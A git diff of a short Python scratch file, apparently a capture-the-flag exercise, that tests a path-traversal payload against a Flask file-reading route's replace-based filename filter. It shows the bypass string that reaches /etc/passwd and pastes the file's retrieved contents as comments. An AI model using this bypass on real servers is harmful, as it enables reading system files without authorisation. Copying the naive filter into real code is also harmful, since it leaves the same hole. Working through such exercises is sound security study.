@@ -1,20 +1,36 @@
-# @APP.route('/read')
-# def read_memo():
-#     error = False
-#     data = b''
-#     filename = request.args.get('name', '')
-#     f = filename.replace("//", "/")
-#     f = f.replace("../", "")
-#     f = f.replace("./", "")
-#     f = f.replace("\\\\", "\\")
-#     f = f.replace("\\", "")
+
+# str = ".....//////uploads/flag.txt"
+str = ".....//////.....//////etc/passwd"
+
+filename = str
+f = filename.replace("//", "/") # filename에서 '//' -> '/'로 변경
+f = f.replace("../", "")        # filename에서 '../' -> ''로 변경
+f = f.replace("./", "")         # filename에서 './' -> ''로 변경
+f = f.replace("\\\\", "\\")     # filename에서 '\\\\' -> '\\'로 변경
+f = f.replace("\\", "")         # filename에서 '\\' -> ''로 변경
+
+print(f'uploads/{f}')
 
 
-a = '11111111'
-print(a)
-a = a.replace('11', '1')
-print(a)
+# http://alpha.a:1000/
 
 
-
-
+# root:x:0:0:root:/root:/bin/bash
+# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+# bin:x:2:2:bin:/bin:/usr/sbin/nologin
+# sys:x:3:3:sys:/dev:/usr/sbin/nologin
+# sync:x:4:65534:sync:/bin:/bin/sync
+# games:x:5:60:games:/usr/games:/usr/sbin/nologin
+# man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+# lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+# mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+# news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+# uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+# proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+# backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+# list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+# irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+# _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+# nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+# YP:x:100:101::/home/YP:/usr/sbin/nologin
